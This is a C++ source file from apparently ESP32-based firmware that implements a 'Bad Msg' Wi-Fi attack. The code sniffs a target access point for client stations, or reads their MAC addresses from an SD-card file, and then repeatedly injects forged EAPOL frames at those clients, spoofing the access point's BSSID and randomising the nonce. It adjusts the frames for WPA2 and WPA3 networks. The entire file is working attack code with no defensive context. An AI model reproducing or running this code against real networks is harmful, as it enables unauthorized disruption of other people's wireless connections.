#include "BadMsgAttacker.h"
#include "App.h"
#include "ConfigManager.h"
#include "Logger.h"
#include <esp_wifi.h>
#include "Config.h" 
#include "SdCardManager.h"

static const uint32_t SNIFF_DURATION_MS = 2500; 
static const uint32_t ATTACK_DURATION_MS = 750;
static const int MAX_CYCLES_WITHOUT_DISCOVERY = 3;

BadMsgAttacker* BadMsgAttacker::instance_ = nullptr;

BadMsgAttacker::BadMsgAttacker() 
    : app_(nullptr), stationSniffer_(nullptr), isActive_(false), isAttackPending_(false),
      packetCounter_(0), lastPacketTime_(0), currentPhase_(AttackPhase::SNIFFING), 
      lastPhaseSwitchTime_(0), currentClientIndex_(0), cyclesWithoutDiscovery_(0)
{
    instance_ = this;
}

void BadMsgAttacker::setup(App* app) {
    app_ = app;
    stationSniffer_ = &app->getStationSniffer();
}

void BadMsgAttacker::prepareAttack(AttackType type) {
    if (isActive_) stop();
    isAttackPending_ = true;
    currentConfig_.type = type;
}

bool BadMsgAttacker::start(const WifiNetworkInfo& targetAp) {
    if (isActive_ || !isAttackPending_ || currentConfig_.type != AttackType::TARGET_AP) return false;

    LOG(LogLevel::INFO, "BAD_MSG", "Starting dynamic TARGET_AP attack on %s", targetAp.ssid);
    currentConfig_.targetAp = targetAp;
    packetCounter_ = 0;
    currentClientIndex_ = 0;
    cyclesWithoutDiscovery_ = 0;
    knownClients_.clear();

    isActive_ = true;
    isAttackPending_ = false;

    switchToSniffPhase();
    return true;
}

bool BadMsgAttacker::start(const StationInfo& targetClient) {
    if (isActive_ || !isAttackPending_ || currentConfig_.type != AttackType::PINPOINT_CLIENT) return false;
    
    LOG(LogLevel::INFO, "BAD_MSG", "Starting PINPOINT attack.");

    currentConfig_.targetClient = targetClient;
    currentConfig_.targetAp.channel = targetClient.channel;
    memcpy(currentConfig_.targetAp.bssid, targetClient.ap_bssid, 6);

    bool ap_info_found = false;
    for (const auto& net : app_->getWifiManager().getScannedNetworks()) {
        if (memcmp(net.bssid, targetClient.ap_bssid, 6) == 0) {
            currentConfig_.targetAp.securityType = net.securityType;
            ap_info_found = true;
            break;
        }
    }
    if (!ap_info_found) {
        LOG(LogLevel::WARN, "BAD_MSG", "Could not find AP in scan results. Assuming WPA2.");
        currentConfig_.targetAp.securityType = WIFI_AUTH_WPA2_PSK;
    }

    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_RAW_TX);
    if (!rfLock_ || !rfLock_->isValid()) {
        LOG(LogLevel::ERROR, "BAD_MSG", "Failed to acquire RF lock for pinpoint attack.");
        return false;
    }
    
    isActive_ = true;
    isAttackPending_ = false;
    packetCounter_ = 0;
    
    switchToAttackOnlyPhase();
    return true;
}

bool BadMsgAttacker::start(const std::string& filePath, const WifiNetworkInfo& targetAp) {
    if (isActive_ || !isAttackPending_ || currentConfig_.type != AttackType::FROM_FILE) return false;
    
    LOG(LogLevel::INFO, "BAD_MSG", "Starting FROM_FILE attack on %s using %s", targetAp.ssid, filePath.c_str());
    currentConfig_.targetAp = targetAp;
    currentConfig_.filePath = filePath;
    packetCounter_ = 0;
    knownClients_.clear();

    auto reader = SdCardManager::getInstance().openLineReader(filePath.c_str());
    if (!reader.isOpen()) {
        LOG(LogLevel::ERROR, "BAD_MSG", "Failed to open station list file: %s", filePath.c_str());
        return false;
    }

    while(true) {
        String line = reader.readLine();
        if (line.isEmpty()) break;
        
        uint8_t mac[6];
        if (sscanf(line.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6) {
            StationInfo client;
            memcpy(client.mac, mac, 6);
            memcpy(client.ap_bssid, targetAp.bssid, 6);
            client.channel = targetAp.channel;
            knownClients_.push_back(client);
        }
    }
    reader.close();

    if (knownClients_.empty()) {
        LOG(LogLevel::ERROR, "BAD_MSG", "No valid MAC addresses found in file.");
        return false;
    }
    
    LOG(LogLevel::INFO, "BAD_MSG", "Loaded %d clients from file.", knownClients_.size());
    isActive_ = true;
    isAttackPending_ = false;
    
    switchToAttackOnlyPhase();
    return true;
}

void BadMsgAttacker::stop() {
    if (!isActive_) return;
    LOG(LogLevel::INFO, "BAD_MSG", "Stopping Bad Msg attack.");
    isActive_ = false;
    isAttackPending_ = false;
    
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    rfLock_.reset();
}

void BadMsgAttacker::loop() {
    if (!isActive_) return;

    if (currentConfig_.type == AttackType::PINPOINT_CLIENT || currentConfig_.type == AttackType::FROM_FILE) {
        if (currentPhase_ == AttackPhase::ATTACK_ONLY) {
            attackNextClient();
        }
        return;
    }

    if (currentPhase_ == AttackPhase::SNIFFING) {
        if (millis() - lastPhaseSwitchTime_ > SNIFF_DURATION_MS) {
            switchToAttackPhase();
        }
    } else if (currentPhase_ == AttackPhase::ATTACKING) {
        if (millis() - lastPhaseSwitchTime_ > ATTACK_DURATION_MS) {
            switchToSniffPhase();
        } else {
            attackNextClient();
        }
    } else if (currentPhase_ == AttackPhase::ATTACK_ONLY) {
        attackNextClient();
    }
}

void BadMsgAttacker::switchToSniffPhase() {
    cyclesWithoutDiscovery_++;
    if (cyclesWithoutDiscovery_ > MAX_CYCLES_WITHOUT_DISCOVERY) {
        LOG(LogLevel::INFO, "BAD_MSG", "No new clients found. Switching to permanent attack mode.");
        switchToAttackOnlyPhase();
        return;
    }

    LOG(LogLevel::INFO, "BAD_MSG", false, "Switching to SNIFF phase (Cycle %d).", cyclesWithoutDiscovery_);
    rfLock_.reset(); 
    
    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
    if (!rfLock_ || !rfLock_->isValid()) {
        LOG(LogLevel::ERROR, "BAD_MSG", "Failed to re-acquire PROMISCUOUS lock. Stopping.");
        stop();
        return;
    }

    esp_wifi_set_promiscuous_rx_cb(&packetHandlerCallback);
    esp_wifi_set_channel(currentConfig_.targetAp.channel, WIFI_SECOND_CHAN_NONE);
    
    currentPhase_ = AttackPhase::SNIFFING;
    lastPhaseSwitchTime_ = millis();
}

void BadMsgAttacker::switchToAttackPhase() {
    LOG(LogLevel::INFO, "BAD_MSG", false, "Switching to ATTACK phase. Known clients: %d", knownClients_.size());
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    rfLock_.reset();

    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_RAW_TX);
    if (!rfLock_ || !rfLock_->isValid()) {
        LOG(LogLevel::ERROR, "BAD_MSG", "Failed to re-acquire RAW_TX lock. Stopping.");
        stop();
        return;
    }

    esp_wifi_set_channel(currentConfig_.targetAp.channel, WIFI_SECOND_CHAN_NONE);

    currentPhase_ = AttackPhase::ATTACKING;
    lastPhaseSwitchTime_ = millis();
    currentClientIndex_ = 0;
}

void BadMsgAttacker::switchToAttackOnlyPhase() {
    LOG(LogLevel::INFO, "BAD_MSG", false, "Switching to ATTACK_ONLY phase. Known clients: %d", knownClients_.size());
    if (currentPhase_ == AttackPhase::SNIFFING) {
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        rfLock_.reset();
    }

    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_RAW_TX);
    if (!rfLock_ || !rfLock_->isValid()) {
        LOG(LogLevel::ERROR, "BAD_MSG", "Failed to acquire RAW_TX lock for attack-only mode. Stopping.");
        stop();
        return;
    }

    esp_wifi_set_channel(currentConfig_.targetAp.channel, WIFI_SECOND_CHAN_NONE);

    currentPhase_ = AttackPhase::ATTACK_ONLY;
    lastPhaseSwitchTime_ = millis();
    currentClientIndex_ = 0;
}

void BadMsgAttacker::attackNextClient() {
    if (knownClients_.empty()) {
        if (currentConfig_.type == AttackType::PINPOINT_CLIENT && millis() - lastPacketTime_ > 50) {
            lastPacketTime_ = millis();
            sendBadMsgPacket(currentConfig_.targetClient, currentConfig_.targetAp.securityType);
        }
        return;
    }

    if (millis() - lastPacketTime_ > 50) {
        lastPacketTime_ = millis();
        if (currentClientIndex_ >= (int)knownClients_.size()) {
            currentClientIndex_ = 0;
        }
        sendBadMsgPacket(knownClients_[currentClientIndex_], currentConfig_.targetAp.securityType);
        currentClientIndex_++;
    }
}

void BadMsgAttacker::packetHandlerCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (instance_ && (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA)) {
        instance_->handlePacket(static_cast<wifi_promiscuous_pkt_t*>(buf));
    }
}

void BadMsgAttacker::handlePacket(wifi_promiscuous_pkt_t *packet) {
    const uint8_t *payload = packet->payload;
    const uint16_t frame_control = payload[0] | (payload[1] << 8);
    const bool to_ds = (frame_control >> 8) & 0x01;
    const bool from_ds = (frame_control >> 9) & 0x01;
    const uint8_t *bssid = nullptr;
    const uint8_t *client_mac = nullptr;
    if (!to_ds && from_ds) { bssid = payload + 10; client_mac = payload + 4; } 
    else if (to_ds && !from_ds) { bssid = payload + 4; client_mac = payload + 10; } 
    else { return; }

    if (memcmp(bssid, currentConfig_.targetAp.bssid, 6) == 0 && !(client_mac[0] & 0x01)) {
        StationInfo newStation;
        memcpy(newStation.mac, client_mac, 6);
        bool found = false;
        for (const auto& st : knownClients_) {
            if (st == newStation) {
                found = true;
                break;
            }
        }
        if (!found) {
            memcpy(newStation.ap_bssid, bssid, 6);
            newStation.channel = currentConfig_.targetAp.channel;
            knownClients_.push_back(newStation);
            cyclesWithoutDiscovery_ = 0;
            char macStr[18];
            sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5]);
            LOG(LogLevel::INFO, "BAD_MSG", "Dynamically discovered new client: %s", macStr);
        }
    }
}

void BadMsgAttacker::sendBadMsgPacket(const StationInfo& client, uint8_t securityType) {
    LOG(LogLevel::DEBUG, "BAD_MSG", false, "Sending EAPOL to %02X:%02X:%02X:%02X:%02X:%02X", client.mac[0], client.mac[1], client.mac[2], client.mac[3], client.mac[4], client.mac[5]);

    uint8_t packet[sizeof(RawFrames::Mgmt::BadMsg::EAPOL_TEMPLATE)];
    memcpy(packet, RawFrames::Mgmt::BadMsg::EAPOL_TEMPLATE, sizeof(packet));
    size_t frame_size = sizeof(packet);

    memcpy(&packet[4], client.mac, 6);
    memcpy(&packet[10], client.ap_bssid, 6);
    memcpy(&packet[16], client.ap_bssid, 6);
    esp_fill_random(&packet[49], 32);

    for (uint8_t i = 0; i < 8; i++) {
        packet[41 + i] = (packetCounter_ >> (56 - i * 8)) & 0xFF;
    }
    
    if (securityType == WIFI_AUTH_WPA3_PSK || securityType == WIFI_AUTH_WPA2_WPA3_PSK || securityType == WIFI_AUTH_WPA3_ENT_192) {
        packet[35] = 0x5f; packet[38] = 0xCB; packet[39] = 0x00; packet[40] = 0x00; frame_size -= 22;
    }
    
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, packet, frame_size, false);
    if (result == ESP_OK) {
        packetCounter_++;
    } else {
        LOG(LogLevel::ERROR, "BAD_MSG", false, "esp_wifi_80211_tx failed! Error: %d", result);
    }
}

// Getters
bool BadMsgAttacker::isActive() const { return isActive_; }
const BadMsgAttacker::AttackConfig& BadMsgAttacker::getConfig() const { return currentConfig_; }
uint32_t BadMsgAttacker::getPacketCount() const { return packetCounter_; }
int BadMsgAttacker::getClientCount() const {
    return (currentConfig_.type == AttackType::PINPOINT_CLIENT) ? (isActive_ ? 1 : 0) : knownClients_.size();
}
bool BadMsgAttacker::isSniffing() const { 
    return (isActive_ && currentConfig_.type == AttackType::TARGET_AP && currentPhase_ == AttackPhase::SNIFFING);
}
uint32_t BadMsgAttacker::getResourceRequirements() const {
    return isActive_ ? (uint32_t)ResourceRequirement::WIFI : (uint32_t)ResourceRequirement::NONE;
}